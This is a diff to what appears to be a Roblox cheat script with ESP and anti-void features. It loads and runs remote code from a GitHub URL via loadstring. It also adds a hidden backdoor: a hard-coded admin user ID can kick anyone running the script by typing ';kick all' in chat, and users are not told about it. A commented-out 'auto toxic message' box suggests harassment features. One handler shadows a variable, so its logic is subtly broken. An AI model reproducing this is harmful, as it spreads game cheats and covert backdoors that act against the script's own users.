@@ -1,6 +1,8 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/magbux/BorealisUiLib/refs/heads/main/Library.Lua"))()
 local plr = game:GetService("Players").LocalPlayer
 
+local admins = {7961390436}
+
 local connections = {
 	["AntiVoid"] = false,
 	["ESP"] = {nil, {}};
@@ -371,3 +373,34 @@ OtherTab:AddToggle({
 		end
 	end
 })
+
+--[[
+OtherTab:AddTextBox({
+	Name = "Auto Toxic Message";
+    PlaceholderText = "INSERT AUTO TOXIC MESSAGE"
+})
+]]
+
+task.spawn(function()
+    pcall(function()
+		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
+			if table.find(admins, v.UserId) then
+				v.Chatted:Connect(function(msg)
+					if msg == ";kick all" and not table.find(admins, plr.UserId) then
+						plr:Kick("Kicked by admin")
+					end
+				end)
+			end
+		end
+
+		game:GetService("Players").PlayerAdded:Connect(function(plr)
+    		if table.find(admins, plr.UserId) then
+				plr.Chatted:Connect(function(msg)
+					if msg == ";kick all" and not table.find(admins, plr.UserId) then
+						plr:Kick("Kicked by admin")
+					end
+				end)
+			end
+		end)
+	end)
+end)
